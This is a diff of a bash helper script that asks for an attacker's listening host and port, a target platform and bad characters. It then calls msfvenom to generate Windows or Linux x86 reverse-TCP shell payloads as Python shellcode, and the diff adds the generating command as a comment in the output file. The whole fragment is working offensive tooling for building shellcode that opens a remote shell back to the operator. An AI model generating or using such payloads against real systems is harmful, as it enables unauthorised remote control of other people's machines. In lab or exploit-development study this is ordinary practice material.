@@ -11,18 +11,18 @@ echo -n " LHOST : "; read ip
 echo -n " LPORT : "; read port
 echo ""
 echo " PLATFORM"
-echo " (l = linux/x86/shell_reverse_tcp; w = windows/shell_reverse_tcp"
+echo " (l = linux/x86/shell_reverse_tcp; w = windows/shell_reverse_tcp)"
 echo -n " : "; read p
-
-# echo "$ip $port $bad $p"
 
 case $p in
 
 	w)
-		msfvenom -p windows/shell_reverse_tcp -b "'$bad'" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread > shellcode.py
+		echo "# msfvenom -p windows/shell_reverse_tcp -b "\"$bad\"" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread" > shellcode.py
+		msfvenom -p windows/shell_reverse_tcp -b "'$bad'" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread >> shellcode.py
 		;;
 	l)
-		msfvenom -p linux/x86/shell_reverse_tcp -b "'$bad'" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread > shellcode.py
+		echo "# msfvenom -p linux/x86/shell_reverse_tcp -b "\"$bad\"" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread" > shellcode.py
+		msfvenom -p linux/x86/shell_reverse_tcp -b "'$bad'" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread >> shellcode.py
 		;;
 	*)
 		echo "Illegal choice"
